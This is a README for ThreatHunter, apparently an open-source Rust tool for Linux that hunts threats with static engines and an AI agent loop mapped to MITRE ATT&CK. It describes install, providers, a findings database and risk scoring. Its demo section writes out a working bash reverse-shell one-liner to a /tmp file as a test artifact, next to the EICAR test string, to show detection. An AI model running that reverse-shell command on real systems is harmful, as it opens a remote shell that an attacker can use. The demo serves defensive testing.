# ThreatHunter

> Autonomous AI-powered threat hunting CLI for Linux — written in Rust.

```
 ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗
    ██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
    ██║   ███████║██████╔╝█████╗  ███████║   ██║
    ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║
    ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║
    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝
  ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Built with Rust](https://img.shields.io/badge/Built%20with-Rust-orange.svg)](https://www.rust-lang.org)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-red.svg)](https://attack.mitre.org)
[![Providers](https://img.shields.io/badge/AI-Claude%20%7C%20OpenAI%20%7C%20Groq%20%7C%20Ollama-blue.svg)](#agentic-ai-investigation)

---

## What it does

Point it at a path. The AI takes over.

```bash
threathunter agent --target /tmp --verbose
```

```
→ scan_filesystem(path=/tmp)
→ read_file_content(path=/tmp/update.sh)
→ inspect_processes(suspicious_only=true)
→ check_network(suspicious_only=true)
→ map_to_mitre(finding=reverse shell script detected)

Risk: HIGH | 2 findings
T1059.004 — Reverse shell in /tmp/update.sh
T1055     — Deleted executable running as PID 1842
```

No playbooks. No pre-defined sequences. The AI decides what to look at next.

---

## Engines

| Engine | What it hunts |
|---|---|
| **Filesystem scanner** | Malware hashes (SHA-256 + MD5), suspicious extensions, executables in `/tmp` |
| **Process inspector** | Deleted executables (fileless malware), masquerading names, root interpreters |
| **Network analyzer** | C2 IPs, backdoor ports (4444, 1337, 31337), raw `/proc/net/tcp` |
| **Mini-SIEM** | Log file analysis with IOC correlation, time-window filtering |
| **MITRE mapper** | Every finding mapped to an ATT&CK Technique ID and Tactic |
| **Report engine** | Weighted risk score, structured JSON output |
| **AI agent** | Autonomous investigation loop — Claude, OpenAI, Groq, or Ollama |
| **Findings DB** | SQLite — every hunt persisted, queryable across sessions |

---

## Install

```bash
git clone https://github.com/acheemala/threat-hunter.git
cd threat-hunter
cargo build --release
sudo cp target/release/threathunter /usr/local/bin/
```

**Requirements:** Linux · Rust 1.75+ · sudo recommended for full `/proc` access

---

## Agentic AI investigation

The agent gives the AI a set of security tools and lets it decide what to investigate next.

### Providers

| Provider | Flag | API key env var | Cost |
|---|---|---|---|
| **Claude** (default) | `--provider claude` | `ANTHROPIC_API_KEY` | Paid |
| **OpenAI** | `--provider openai` | `OPENAI_API_KEY` | Paid |
| **Groq** | `--provider groq` | `GROQ_API_KEY` | Free tier |
| **Ollama** | `--provider ollama` | none | Free, local |

```bash
# Claude — best investigation quality
export ANTHROPIC_API_KEY=sk-ant-...
threathunter agent --target /tmp

# OpenAI GPT-4o
export OPENAI_API_KEY=sk-...
threathunter agent --target /home --provider openai

# Groq — fast, free tier available
export GROQ_API_KEY=gsk_...
threathunter agent --target /var --provider groq

# Ollama — fully local, no API key, air-gap friendly
threathunter agent --target /tmp --provider ollama --model llama3.2

# Any OpenAI-compatible endpoint (Azure, Together AI, custom)
threathunter agent --target /tmp --provider openai \
  --api-url https://my-endpoint/v1/chat/completions \
  --api-key <key>
```

### Agent flags

```bash
--target <path>          path to investigate (default: .)
--provider <name>        claude | openai | groq | ollama
--model <model>          override default model
--api-url <url>          custom endpoint
--max-iterations <n>     tool-call rounds before forced report (default: 10)
--verbose                show each tool call live
--save <file>            save report as Markdown
--campaign <id>          tag to a campaign for trend tracking
--no-persist             skip database write
```

---

## Persistent findings database

Every agent run is saved to `~/.config/threathunter/db.sqlite`.

```bash
# Query findings from the last 7 days
threathunter findings

# Only HIGH and CRITICAL
threathunter findings --severity HIGH

# Last 24 hours, JSON output
threathunter findings --since 24h --json

# List all past hunt sessions
threathunter hunts
```

---

## Static commands (no AI)

```bash
# Filesystem scan
threathunter scan --path /tmp

# Running processes
threathunter process --suspicious-only

# Network connections
threathunter network --suspicious-only

# MITRE ATT&CK mapping
threathunter mitre --finding "reverse shell in /tmp"

# Full report (all engines, no AI)
threathunter report --path /tmp
```

---

## OpenClaw integration

Trigger threat hunts from WhatsApp, Slack, or Discord via [OpenClaw](https://openclaw.ai):

```
You → "scan /tmp for threats"
OpenClaw → threathunter agent --target /tmp
OpenClaw → "Risk: HIGH — reverse shell found in /tmp/update.sh (T1059)"
```

Install the skill:
```bash
cp -r openclaw-skill ~/.openclaw/skills/threathunter
```

See [`openclaw-skill/`](openclaw-skill/) for full setup.

---

## MITRE ATT&CK coverage

| Tactic | Techniques |
|---|---|
| Execution | T1059, T1059.001, T1059.004 |
| Defense Evasion | T1036, T1036.007, T1055, T1055.012 |
| Persistence | T1053.003, T1098.004 |
| Credential Access | T1003.001 |
| Command & Control | T1071, T1105, T1571 |
| Impact | T1496 |

---

## Risk scoring

```
CRITICAL ×40    HIGH ×15    MEDIUM ×5    LOW ×1

0        → CLEAN
1–15     → LOW
16–55    → MEDIUM
56–120   → HIGH
121+     → CRITICAL
```

---

## Architecture

```
src/
├── main.rs              CLI routing (clap)
├── scanner.rs           Filesystem + hash engine
├── process.rs           /proc process engine
├── network.rs           /proc/net/tcp engine
├── ioc.rs               IOC database
├── report.rs            Finding + ThreatReport types
├── db/                  SQLite persistence (sqlx)
└── agent/
    ├── provider.rs      AiProvider trait — neutral message types
    ├── providers/
    │   ├── claude.rs    Anthropic Messages API
    │   └── openai.rs    OpenAI-compatible (Groq, Ollama, Azure)
    ├── loop.rs          Agentic investigation loop
    └── tools.rs         Security tools the AI can call
```

---

## Demo

### Plant safe test artifacts

```bash
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > /tmp/update.sh
chmod +x /tmp/update.sh
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
```

### Run

```bash
# AI investigation (the full experience)
threathunter agent --target /tmp --verbose

# Or individual engines
threathunter scan --path /tmp
threathunter process --suspicious-only
threathunter network --suspicious-only

# Query what was found
threathunter findings --severity HIGH
```

### Cleanup

```bash
rm -f /tmp/update.sh /tmp/eicar.com
```

---

## Learning Program

Learn Rust, security engineering, and agentic AI by contributing to this project — one PR at a time.

- **3 tracks:** Rust + CLI / Security Engineering / Agentic AI
- **2 paces:** 6-month or 12-month
- **No experience required**

→ Full curriculum: [LEARNING_PROGRAM.md](LEARNING_PROGRAM.md)
→ How to contribute: [CONTRIBUTING.md](CONTRIBUTING.md)
→ Join: open a [Discussion → Introductions](../../discussions)

---

## License

MIT — see [LICENSE](LICENSE) for details.

---

## Disclaimer

For authorized security testing, incident response, and educational use only. Do not use against systems you do not own or have explicit permission to test.
